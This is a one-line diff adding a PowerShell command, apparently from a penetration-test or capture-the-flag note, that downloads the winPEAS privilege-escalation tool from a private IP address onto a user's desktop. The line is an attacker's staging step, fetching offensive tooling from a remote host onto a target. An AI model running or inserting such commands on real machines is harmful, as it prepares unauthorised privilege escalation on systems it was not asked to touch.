@@ -1,0 +1,1 @@
+powershell -c (new-object System.Net.WebClient).DownloadFile(‘http://10.18.84.211:9000/winPEASx64.exe','C:\Users\bill\Desktop\winpeas.exe')
